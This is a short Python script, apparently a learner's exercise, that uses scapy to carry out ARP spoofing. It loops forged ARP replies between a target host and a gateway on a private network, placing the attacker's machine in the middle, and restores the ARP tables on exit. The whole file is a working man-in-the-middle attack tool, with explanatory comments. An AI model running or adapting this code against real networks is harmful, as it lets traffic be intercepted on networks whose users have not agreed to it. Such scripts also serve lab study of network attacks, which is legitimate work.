#!/usr/bin/env/ python
import scapy.all as scapy
import time
import sys
#to know what frields we can set we need to do 
# >> import scapy.all from scapy
# >> scapy.ls(scapy.ARP)


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    #arp packet object \\ 
    broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    #setting the broadcast mac
    #print(arp_request.summary())
    arp_request_broadcast=broadcast/arp_request
    answered, unanswered = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)
    #srp is used to generate packets
    return answered[0][1].hwsrc #returning mac of the respective IP

def spoof(target_ip,spoof_ip): 
    target_mac=get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    #op =1 is arp_request op=2 is arp_response
    #pdst= dst ip and hwdt is mac of target
    #psrc is what ip u want to act as ( here the IP of router is used)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet,verbose=False) #packet is sent to the windows machine

def restore(dest_ip,source_ip):
    dest_mac=get_mac(dest_ip)
    source_mac=get_mac(source_ip)
    packet=scapy.ARP(op=2,pdst=dest_ip,hwdst=dest_mac,psrc=source_ip,hwsrc=source_mac)
    scapy.send(packet,verbose=False) 


target_ip="192.168.1.103"
gateway_ip="192.168.1.1" 
sent_packets_count=0

try:
    while True:
        spoof("192.168.1.103","192.168.1.1")
        spoof("192.168.1.1","192.168.1.103")
        sent_packets_count+=2
        print("\rPackets sent: "+str(sent_packets_count)),
        sys.stdout.flush() #flushes the buffer 
        time.sleep(2)
except KeyboardInterrupt:
    print("CTRL +C ... Resetinng ARP tables")
    restore(target_ip,gateway_ip)
    restore(gateway_ip,target_ip)

